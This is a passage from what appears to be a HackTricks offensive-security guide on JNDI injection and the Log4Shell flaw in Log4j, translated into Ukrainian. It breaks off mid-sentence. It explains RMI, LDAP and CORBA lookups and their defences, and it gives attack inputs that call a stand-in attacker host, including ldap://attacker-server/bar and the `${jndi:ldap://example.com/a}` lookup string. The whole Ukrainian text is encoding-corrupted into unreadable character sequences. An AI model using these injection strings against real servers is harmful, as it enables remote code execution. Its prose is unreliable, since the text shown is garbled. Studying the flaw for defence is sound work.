# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>

**Try Hard Security Group**

<figure><img src="../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

JNDI, —ñ–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω–∏–π –≤ Java –∑ –∫—ñ–Ω—Ü—è 1990-—Ö —Ä–æ–∫—ñ–≤, —Å–ª—É–∂–∏—Ç—å —è–∫ —Å–ª—É–∂–±–∞ –∫–∞—Ç–∞–ª–æ–≥—ñ–≤, —â–æ –¥–æ–∑–≤–æ–ª—è—î Java-–ø—Ä–æ–≥—Ä–∞–º–∞–º –∑–Ω–∞—Ö–æ–¥–∏—Ç–∏ –¥–∞–Ω—ñ –∞–±–æ –æ–±'—î–∫—Ç–∏ —á–µ—Ä–µ–∑ —Å–∏—Å—Ç–µ–º—É —ñ–º–µ–Ω—É–≤–∞–Ω–Ω—è. –í—ñ–Ω –ø—ñ–¥—Ç—Ä–∏–º—É—î —Ä—ñ–∑–Ω—ñ —Å–ª—É–∂–±–∏ –∫–∞—Ç–∞–ª–æ–≥—ñ–≤ —á–µ—Ä–µ–∑ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—ñ–≤ –ø–æ—Å–ª—É–≥ (SPI), —â–æ –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ –∑ —Ä—ñ–∑–Ω–∏—Ö —Å–∏—Å—Ç–µ–º, –≤–∫–ª—é—á–∞—é—á–∏ –≤—ñ–¥–¥–∞–ª–µ–Ω—ñ –æ–±'—î–∫—Ç–∏ Java. –ó–∞–≥–∞–ª—å–Ω—ñ SPI –≤–∫–ª—é—á–∞—é—Ç—å CORBA COS, Java RMI Registry —Ç–∞ LDAP.

### –ü–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —ñ–º–µ–Ω–∞ JNDI

Java-–æ–±'—î–∫—Ç–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–±–µ—Ä–µ–∂–µ–Ω—ñ —Ç–∞ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–æ—Å–∏–ª–∞–Ω—å –Ω–∞ —ñ–º–µ–Ω–∞ JNDI, —è–∫—ñ –º–∞—é—Ç—å –¥–≤—ñ —Ñ–æ—Ä–º–∏:

* **–ê–¥—Ä–µ—Å–∏ –ø–æ—Å–∏–ª–∞–Ω—å**: –í–∫–∞–∑—É—î –º—ñ—Å—Ü–µ–∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, _rmi://server/ref_), —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø—Ä—è–º–µ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∑ –≤–∫–∞–∑–∞–Ω–æ—ó –∞–¥—Ä–µ—Å–∏.
* **–í—ñ–¥–¥–∞–ª–µ–Ω–∏–π –∑–∞–≤–æ–¥**: –ü–æ—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ –≤—ñ–¥–¥–∞–ª–µ–Ω–∏–π –∫–ª–∞—Å –∑–∞–≤–æ–¥—É. –ü—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –∫–ª–∞—Å –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è —Ç–∞ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –∑ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –º—ñ—Å—Ü—è.

–û–¥–Ω–∞–∫ —Ü–µ–π –º–µ—Ö–∞–Ω—ñ–∑–º –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É. –Ø–∫ –ø—Ä–æ—Ç–∏–∞–≥–∞:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –∑ JDK 7u21, –æ–±–º–µ–∂—É—é—á–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—ñ–¥–¥–∞–ª–µ–Ω–∏—Ö –æ–±'—î–∫—Ç—ñ–≤. –ú–µ–Ω–µ–¥–∂–µ—Ä –±–µ–∑–ø–µ–∫–∏ –ø–æ–¥–∞–ª—å—à–µ –æ–±–º–µ–∂—É—î —Ç–µ, —â–æ –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –∑ JDK 6u141, 7u131, 8u121, –±–ª–æ–∫—É—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤—ñ–¥–¥–∞–ª–µ–Ω–∏—Ö –æ–±'—î–∫—Ç—ñ–≤ Java, —è–∫—ñ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å—Å—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ. –Ø–∫—â–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ `true`, –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –∫–æ–¥—É –º–æ–∂–ª–∏–≤–µ –±–µ–∑ –Ω–∞–≥–ª—è–¥—É –º–µ–Ω–µ–¥–∂–µ—Ä–∞ –±–µ–∑–ø–µ–∫–∏.
* **CORBA**: –ù–µ –º–∞—î –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, –∞–ª–µ –ú–µ–Ω–µ–¥–∂–µ—Ä –±–µ–∑–ø–µ–∫–∏ –∑–∞–≤–∂–¥–∏ –∞–∫—Ç–∏–≤–Ω–∏–π.

–ü—Ä–æ—Ç–µ **–ú–µ–Ω–µ–¥–∂–µ—Ä —ñ–º–µ–Ω**, –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω–∏–π –∑–∞ —Ä–æ–∑–≤'—è–∑–∞–Ω–Ω—è –ø–æ—Å–∏–ª–∞–Ω—å JNDI, –Ω–µ –º–∞—î –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö –º–µ—Ö–∞–Ω—ñ–∑–º—ñ–≤ –±–µ–∑–ø–µ–∫–∏, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –æ–±'—î–∫—Ç–∏ –∑ –±—É–¥—å-—è–∫–æ–≥–æ –¥–∂–µ—Ä–µ–ª–∞. –¶–µ —Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ä–∏–∑–∏–∫, –æ—Å–∫—ñ–ª—å–∫–∏ –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç–∏ RMI, LDAP —Ç–∞ CORBA, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –æ–±'—î–∫—Ç—ñ–≤ Java –∞–±–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —ñ—Å–Ω—É—é—á–∏—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ñ–≤ –¥–æ–¥–∞—Ç–∫—ñ–≤ (–≥–∞–¥–∂–µ—Ç—ñ–≤) –¥–ª—è –∑–∞–ø—É—Å–∫—É —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –∫–æ–¥—É.

–ü—Ä–∏–∫–ª–∞–¥–∏ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö URL-–∞–¥—Ä–µ—Å –≤–∫–ª—é—á–∞—é—Ç—å:

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

–ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ –∑–∞—Ö–∏—Å—Ç, –∑–∞–ª–∏—à–∞—é—Ç—å—Å—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, –≥–æ–ª–æ–≤–Ω–∏–º —á–∏–Ω–æ–º —á–µ—Ä–µ–∑ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –∑–∞—Ö–∏—Å—Ç—É –≤—ñ–¥ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è JNDI –∑ –Ω–µ–Ω–∞–¥—ñ–π–Ω–∏—Ö –¥–∂–µ—Ä–µ–ª —Ç–∞ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –æ–±—Ö–æ–¥—É —ñ—Å–Ω—É—é—á–∏—Ö –∑–∞—Ö–∏—Å—Ç—ñ–≤.

### –ü—Ä–∏–∫–ª–∞–¥ JNDI

![](<../../.gitbook/assets/image (655) (1) (1).png>)

–ù–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –≤—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ **`PROVIDER_URL`**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ —ñ–Ω—à–∏–π —É –ø–æ—à—É–∫—É, —ñ –≤—ñ–Ω –±—É–¥–µ –¥–æ—Å—Ç—É–ø–Ω–∏–π: `ctx.lookup("<attacker-controlled-url>")`, —ñ —Ü–µ —Ç–µ, —â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—î –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –æ–±'—î–∫—Ç—ñ–≤ –∑ —Å–∏—Å—Ç–µ–º–∏, —è–∫–æ—é –≤—ñ–Ω –∫–µ—Ä—É—î.

### –û–≥–ª—è–¥ CORBA

CORBA (Common Object Request Broker Architecture) –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–Ü–Ω—Ç–µ—Ä–æ–ø–µ—Ä–∞–±–µ–ª—å–Ω–∏–π –û–±'—î–∫—Ç–Ω–∏–π –ü–æ—Å–∏–ª–∞–Ω–Ω—è (IOR)** –¥–ª—è —É–Ω—ñ–∫–∞–ª—å–Ω–æ—ó —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –≤—ñ–¥–¥–∞–ª–µ–Ω–∏—Ö –æ–±'—î–∫—Ç—ñ–≤. –¶–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –≤–∫–ª—é—á–∞—î –≤–∞–∂–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —Ç–∞–∫—É —è–∫:

* **–Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä —Ç–∏–ø—É**: –£–Ω—ñ–∫–∞–ª—å–Ω–∏–π —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É.
* **Codebase**: URL –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∫–ª–∞—Å—É-–∑–∞–≥–ª—É—à–∫–∏.

–ù–∞ –≤—ñ–¥–º—ñ–Ω—É –≤—ñ–¥, CORBA –Ω–µ —î –≤—Ä–æ–¥–∂–µ–Ω–æ –≤—Ä–∞–∑–ª–∏–≤–∏–º. –ó–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ –∑–∞–∑–≤–∏—á–∞–π –≤–∫–ª—é—á–∞—î:

* –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è **–ú–µ–Ω–µ–¥–∂–µ—Ä–∞ –±–µ–∑–ø–µ–∫–∏**.
* –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –ú–µ–Ω–µ–¥–∂–µ—Ä–∞ –±–µ–∑–ø–µ–∫–∏ –¥–ª—è –¥–æ–∑–≤–æ–ª—É –ø—ñ–¥–∫–ª—é—á–µ–Ω—å –¥–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ —à–∫—ñ–¥–ª–∏–≤–∏—Ö –∫–æ–¥–æ–≤–∏—Ö –±–∞–∑. –¶–µ –º–æ–∂–Ω–∞ –¥–æ—Å—è–≥—Ç–∏ —á–µ—Ä–µ–∑:
* –î–æ–∑–≤—ñ–ª —Å–æ–∫–µ—Ç—É, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
* –î–æ–∑–≤—ñ–ª –Ω–∞ —á–∏—Ç–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, –∞–±–æ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–æ (`permission java.io.FilePermission "<<ALL FILES>>", "read";`) –∞–±–æ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –∫–∞—Ç–∞–ª–æ–≥—ñ–≤, –¥–µ –º–æ–∂—É—Ç—å –±—É—Ç–∏ —Ä–æ–∑–º—ñ—â–µ–Ω—ñ —à–∫—ñ–¥–ª–∏–≤—ñ —Ñ–∞–π–ª–∏.

–ü—Ä–æ—Ç–µ –¥–µ—è–∫—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ –≤–∏—Ä–æ–±–Ω–∏–∫—ñ–≤ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ª–∞–≥—ñ–¥–Ω–∏–º–∏ —ñ –¥–æ–∑–≤–æ–ª—è—Ç–∏ —Ü—ñ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º.

### –ö–æ–Ω—Ç–µ–∫—Å—Ç RMI

–î–ª—è RMI (Remote Method Invocation) —Å–∏—Ç—É–∞—Ü—ñ—è —Ç—Ä–æ—Ö–∏ –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è. –Ø–∫ —ñ –≤ CORBA, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–ª–∞—Å—ñ–≤ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –æ–±–º–µ–∂–µ–Ω–æ. –î–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó RMI –∑–∞–∑–≤–∏—á–∞–π –ø–æ—Ç—Ä—ñ–±–Ω–æ –æ–±—ñ–π—Ç–∏ –ú–µ–Ω–µ–¥–∂–µ—Ä –±–µ–∑–ø–µ–∫–∏, —â–æ —Ç–∞–∫–æ–∂ –≤–∞–∂–ª–∏–≤–æ –¥–ª—è CORBA.

### LDAP

–ü–æ-–ø–µ—Ä—à–µ, –ø–æ—Ç—Ä—ñ–±–Ω–æ —Ä–æ–∑—Ä—ñ–∑–Ω—è—Ç–∏ –º—ñ–∂ –ü–æ—à—É–∫–æ–º —Ç–∞ –ü–æ—à—É–∫–æ–º.\
**–ü–æ—à—É–∫** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ URL-–∞–¥—Ä–µ—Å—É, –ø–æ–¥—ñ–±–Ω—É –¥–æ `ldap://localhost:389/o=JNDITutorial`, —â–æ–± –∑–Ω–∞–π—Ç–∏ –æ–±'—î–∫—Ç JNDITutorial –Ω–∞ LDAP-—Å–µ—Ä–≤–µ—Ä—ñ —Ç–∞ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –π–æ–≥–æ –∞—Ç—Ä–∏–±—É—Ç–∏**.\
**–ü–æ—à—É–∫** –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è **—Å–ª—É–∂–± —ñ–º–µ–Ω**, –æ—Å–∫—ñ–ª—å–∫–∏ –º–∏ —Ö–æ—á–µ–º–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ **–≤—Å–µ, —â–æ –ø—Ä–∏–≤'—è–∑–∞–Ω–æ –¥–æ —ñ–º–µ–Ω—ñ**.

–Ø–∫—â–æ LDAP-–ø–æ—à—É–∫ –±—É–≤ –≤–∏–∫–ª–∏–∫–∞–Ω–∏–π –∑ **SearchControls.setReturningObjFlag() –∑ `true`, —Ç–æ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏–π –æ–±'—î–∫—Ç –±—É–¥–µ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–∏–π**.

–û—Ç–∂–µ, —î –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ –∞—Ç–∞–∫–∏ —Ü–∏—Ö –æ–ø—Ü—ñ–π.\
**–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–∞–±—Ä—É–¥–Ω—é–≤–∞—Ç–∏ –∑–∞–ø–∏—Å–∏ LDAP, –≤–≤–æ–¥—è—á–∏ –≤ –Ω–∏—Ö –ø–µ–π–ª–æ–∞–¥–∏**, —è–∫—ñ –±—É–¥—É—Ç—å –≤–∏–∫–æ–Ω–∞–Ω—ñ –≤ —Å–∏—Å—Ç–µ–º–∞—Ö, —è–∫—ñ —ó—Ö –∑–±–∏—Ä–∞—é—Ç—å (–¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è **–∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó –¥–µ—Å—è—Ç–∫—ñ–≤ –º–∞—à–∏–Ω**, —è–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ LDAP). –Ü–Ω—à–∏–π —Å–ø–æ—Å—ñ–± –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –ø–æ–ª—è–≥–∞—î –≤ –ø—Ä–æ–≤–µ–¥–µ–Ω–Ω—ñ **–∞—Ç–∞–∫–∏ —Ç–∏–ø—É Man-in-the-Middle –≤ –ø–æ—à—É–∫—É LDAP**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥.

–£ –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –≤–∏ **–º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ –¥–æ–¥–∞—Ç–æ–∫ —Ä–æ–∑—Ä—ñ—à–∏—Ç–∏ JNDI LDAP UR**, –≤–∏ –º–æ–∂–µ—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ LDAP, —è–∫–∏–π –±—É–¥–µ —à—É–∫–∞—Ç–∏, —ñ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –Ω–∞–∑–∞–¥ –µ–∫—Å–ø–ª–æ–π—Ç (log4shell).

#### –ï–∫—Å–ø–ª–æ–π—Ç –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

**–ï–∫—Å–ø–ª–æ–π—Ç —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π** —ñ –±—É–¥–µ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π.\
–£ –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ `trustURLCodebase` –¥–æ—Ä—ñ–≤–Ω—é—î `true`, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –Ω–∞–¥–∞—Ç–∏ —Å–≤–æ—ó –≤–ª–∞—Å–Ω—ñ –∫–ª–∞—Å–∏ –≤ –∫–æ–¥–æ–≤—ñ–π –±–∞–∑—ñ, —è–∫—â–æ –Ω—ñ, –π–æ–º—É –¥–æ–≤–µ–¥–µ—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≥–∞–¥–∂–µ—Ç–∏ –≤ —à–ª—è—Ö—É –¥–æ –∫–ª–∞—Å—É.

#### –ï–∫—Å–ø–ª–æ–π—Ç –ø–æ—Å–∏–ª–∞–Ω–Ω—è JNDI

–¶–µ –ª–µ–≥—à–µ –∞—Ç–∞–∫—É–≤–∞—Ç–∏ —Ü–µ–π LDAP, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **–ø–æ—Å–∏–ª–∞–Ω–Ω—è JavaFactory**:

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## –£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å Log4Shell

–£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–Ω–∏–∫–∞—î –≤ Log4j, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –ø—ñ–¥—Ç—Ä–∏–º—É—î [**—Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏–π —Å–∏–Ω—Ç–∞–∫—Å–∏—Å**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) —É —Ñ–æ—Ä–º—ñ `${prefix:name}`, –¥–µ `prefix` —î –æ–¥–Ω–∏–º –∑ —á–∏—Å–ª–µ–Ω–Ω–∏—Ö —Ä—ñ–∑–Ω–∏—Ö [**–ü–æ—à—É–∫—ñ–≤**](https://logging.apache.org/log4j/2.x/manual/lookups.html), –¥–µ `name` –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –æ—Ü—ñ–Ω–µ–Ω–æ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, `${java:version}` - —Ü–µ –ø–æ—Ç–æ—á–Ω–∞ –≤–µ—Ä—Å—ñ—è Java.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) –≤–≤–æ–¥–∏—Ç—å —Ñ—É–Ω–∫—Ü—ñ—é –ø–æ—à—É–∫—É `jndi`. –¶—è —Ñ—É–Ω–∫—Ü—ñ—è –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –∑–º—ñ–Ω–Ω—ñ —á–µ—Ä–µ–∑ JNDI. –ó–∞–∑–≤–∏—á–∞–π –∫–ª—é—á –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø–æ–ø–µ—Ä–µ–¥–∂—É—î—Ç—å—Å—è –ø—Ä–µ—Ñ—ñ–∫—Å–æ–º `java:comp/env/`. –û–¥–Ω–∞–∫ —è–∫—â–æ —Å–∞–º –∫–ª—é—á –º—ñ—Å—Ç–∏—Ç—å **":"**, —Ü–µ–π –ø—Ä–µ—Ñ—ñ–∫—Å –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è.

–ó –Ω–∞—è–≤–Ω—ñ—Å—Ç—é **":"** —É –∫–ª—é—á—ñ, —è–∫ —É `${jndi:ldap://example.com/a}`, **–ø—Ä–µ—Ñ—ñ–∫—Å –≤—ñ–¥—Å—É—Ç–Ω—ñ–π**, —ñ **LDAP-—Å–µ—Ä–≤–µ—Ä –∑–∞–ø–∏—Ç—É—î—Ç—å—Å—è –¥–ª—è –æ–±'—î–∫—Ç–∞**. –¶—ñ –ü–æ—à—É–∫–∏ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è —è–∫ —É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó Log4j, —Ç–∞–∫ —ñ –ø—Ä–∏ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –ª—ñ–Ω—ñ–π.

–û—Ç–∂–µ, —î–¥–∏–Ω–µ, —â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE - **—É—Ä–∞–∑–ª–∏–≤–∞ –≤–µ—Ä—Å—ñ—è Log4j, —è–∫–∞ –æ–±—Ä–æ–±–ª—è—î —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –∫–µ—Ä–æ–≤–∞–Ω—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**. –Ü –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞, —à–∏—Ä–æ–∫–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω–∞ Java-–¥–æ–¥–∞—Ç–∫–∞–º–∏ –¥–ª—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó (–≤–∫–ª—é—á–∞—é—á–∏ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç-–∑–∞—Å—Ç–æ—Å—É–Ω–∫–∏), –¥—É–∂–µ —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∞—Å—è log4j –¥–ª—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –æ—Ç—Ä–∏–º–∞–Ω–∏—Ö HTTP-–∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ User-Agent. –û–¥–Ω–∞–∫ log4j **–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ª–∏—à–µ –¥–ª—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó HTTP-—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, –∞–ª–µ 